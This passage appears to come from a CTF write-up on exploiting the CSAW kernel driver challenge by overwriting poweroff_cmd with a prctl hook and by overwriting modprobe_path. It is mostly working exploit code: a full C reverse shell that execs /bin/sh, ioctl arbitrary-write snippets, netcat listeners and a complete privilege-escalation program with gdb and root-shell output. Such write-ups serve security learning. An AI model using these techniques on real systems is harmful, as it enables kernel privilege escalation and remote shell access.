        rdx: 0x7ffe6e1344a8 : ▸ 0x7ffe6e134fcc ◂:  0x323d4c564c4853 /* 'SHLVL=2' */
        rcx: 0x0
 
   0xffffffff81346801 <security_task_prctl+81>    cmp    eax, -0x26
   0xffffffff81346804 <security_task_prctl+84>    je     security_task_prctl+93            <security_task_prctl+93>
 
   0xffffffff81346806 <security_task_prctl+86>    test   eax, eax
   0xffffffff81346808 <security_task_prctl+88>    jne    security_task_prctl+123            <security_task_prctl+123>
 
   0xffffffff8134680a <security_task_prctl+90>    xor    r15d, r15d
─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0xffff88000fbb3eb0 ◂:  0x20000
01:0008│-030 0xffff88000fbb3eb8 ◂:  0x0
02:0010│-028 0xffff88000fbb3ec0 : ▸ 0x7ffe6e1344a8 : ▸ 0x7ffe6e134fcc ◂:  0x323d4c564c4853 /* 'SHLVL=2' */
03:0018│-020 0xffff88000fbb3ec8 ◂:  0x0
04:0020│-018 0xffff88000fbb3ed0 ◂:  0x0
05:0028│-010 0xffff88000fbb3ed8 ◂:  0x20000
06:0030│-008 0xffff88000fbb3ee0 ◂:  0x0
07:0038│ rbp 0xffff88000fbb3ee8 : ▸ 0xffff88000fbb3f48 : ▸ 0x7ffe6e134450 ◂:  0x1
───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0 0xffffffff813467fe security_task_prctl+78
   1          0x20000
   2              0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> p/x $rbx+0x18
$3 = 0xffffffff81eb7df8
```
So now we have all the address we actually need! Let's go build the exploit...
For the reverse shell I am going to use [this](https://gist.github.com/0xabe-io/916cf3af33d1c0592a90), if you are asking why do we need a reverse shell is because we can't call any userland program to execute directly poweroff_work_func and I will show you a trick later...
```c
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT XXX

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
```
So we can update the exploit from [leak](#Leak)...
Create a buffer to store the reverse_shell command:
```c
char *buf = malloc(0x1000);
memset(buf, '\0',0x1000);
strcpy(buf, "/reverse_shell\0"); // final null byte is really important!
```
Set poweroff_cmd to buf:
```c
//set the address
seek_channel.id = id;
seek_channel.index = poweroff_cmd - 0x10;
seek_channel.whence = SEEK_SET;
ioctl(fd,CSAW_SEEK_CHANNEL,&seek_channel);
//overwrite it	
struct write_channel_args write_channel;
write_channel.id = id;
write_channel.buf = buf;
write_channel.count = strlen(buf);
ioctl(fd,CSAW_WRITE_CHANNEL,&write_channel);
```

We can be sure to have overwritten the `poweroff_cmd` command by just looking at gdb:
```
pwndbg> x/s 0xffffffff81e4dfa0
0xffffffff81e4dfa0:	"/reverse_shell"
```
Finally we make point `task_prctl` to `poweroff_work_func`:
```c
memset(buf,'\0',0x1000);
seek_channel.id = id;
seek_channel.index = poweroff_cmd+14-0x10 ;
seek_channel.whence= SEEK_SET;	
ioctl(fd,CSAW_SEEK_CHANNEL,&seek_channel);
	
write_channel.id = id;
write_channel.buf = buf;
write_channel.count = 1;
ioctl(fd,CSAW_WRITE_CHANNEL,&write_channel);
	
memset(buf,'\0',0x1000);
*(size_t *)buf = poweroff_work_func;
seek_channel.id = id;
seek_channel.index = prctl_hook-0x10 ;
seek_channel.whence= SEEK_SET;	
ioctl(fd,CSAW_SEEK_CHANNEL,&seek_channel);
	
write_channel.id = id;
write_channel.buf = buf;
write_channel.count = 20+1;
ioctl(fd,CSAW_WRITE_CHANNEL,&write_channel);
```
Now the last thing we need is actually call prctl, from c we do this:
```c
if(fork() == 0 ){ //Here why we use a reverse shell, we create a new process...
	prctl(0,0);
	exit(-1);
}
system("nc -l -p PORT_of_REVSHELL");
```
Debugging in gdb, and stopping at `security_task_prctl+78`, where we call the task_prctl table we see:
```
 ► 0xffffffff813467fe <security_task_prctl+78>    call   qword ptr [rbx + 0x18]        <poweroff_work_func>
        rdi: 0x0
        rsi: 0x0
        rdx: 0x1057680 : ▸ 0x4d0a90 ◂:  0x1057680
        rcx: 0x4503d2 ◂:  0x1f0f2e66c3c08944
```
where rdi, rsi, rdx and rcx contains the value of the arguments of prctl
So executing our payload we get:
```
/ $ /tmp/pwn
[+] now we get a channel 1
[+] found vdso ffffffff81e04000
[+] found kernel base: ffffffff81000000
[+] found prctl_hook: ffffffff81eb7df8
[+] found poweroff_cmd : ffffffff81e4dfa0
[+] found poweroff_work_func: ffffffff810a39c0
sh -i
sh: can't access tty; job control turned off
/ # cat /flag
this is a sample flag
```

### An easier payload...
This time we will overwrite modprobe_path:
```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/prctl.h>

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE + 1
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE + 3
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE + 5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE + 6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE + 7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE + 8
#define SEEK_SET    0
typedef unsigned long loff_t;
struct alloc_channel_args {
    size_t buf_size;
    int id;
};
struct grow_channel_args {
    int id;
    size_t size;
};
struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};
struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};
struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};
struct close_channel_args {
    int id;
};

void get_root(void){
	if (fork()==0){ 
		system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
		system("chmod +x /tmp/dummy");
		for (int i=0;i<10;i++){
			system("/tmp/dummy");
		}
	}
	system("nc -l -p 2333");
	exit(0);
}

int fd;
int main(){
	//OPEN THE DEVICE
	fd = open("/dev/csaw",O_RDWR);
	if(fd < 0){return -1;}
	// Create a new IPC
	struct alloc_channel_args alloc_channel;
    	alloc_channel.buf_size = 0x1000;
    	ioctl(fd, CSAW_ALLOC_CHANNEL, &alloc_channel);
    	int id = alloc_channel.id;
    	printf("[+] channel id: %d\n", id);
    	// GROW TRICK
        struct grow_channel_args grow_channel;
    	grow_channel.id = id;
   	grow_channel.size = 0xffffffffffffffff - alloc_channel.buf_size;
    	ioctl(fd, CSAW_GROW_CHANNEL, &grow_channel);
	//EXPLOIT
	unsigned long modprobe = 0xffffffff81e4c800; //ffffffff81e4c800 D modprobe_path
	char *buf = malloc(0x1000);
	memset(buf, '\0',0x1000);
	strcpy(buf, "/reverse_shell\0");
	//set the address to modprobe_path
	struct seek_channel_args seek_channel;
	seek_channel.id = id;
	seek_channel.index = modprobe - 0x10;
	seek_channel.whence = SEEK_SET;
	ioctl(fd,CSAW_SEEK_CHANNEL,&seek_channel);
	//overwrite modprobe_path
	struct write_channel_args write_channel;
	write_channel.id = id;
	write_channel.buf = buf;
	write_channel.count = strlen(buf);
	ioctl(fd,CSAW_WRITE_CHANNEL,&write_channel);

	get_root();

	return 0;
}
```

So as you can see the usual modprobe overwrite is so powerful! It needs only an arbitrary write and then just userland interactions...

So the other techinques were cool and obv fascinating to learn about but
MODPROBE_PATH >> *.

Thanks for reading. Hope to write more stuff in 2024!

What to expect on next blogs:
- eBPF
- Some more exotic call_usermode interactions
- Maybe a msg_msg blog
- Other CTF writeups? 
- Fuzzing stuff? (Don't know...)
But I mean you got the idea!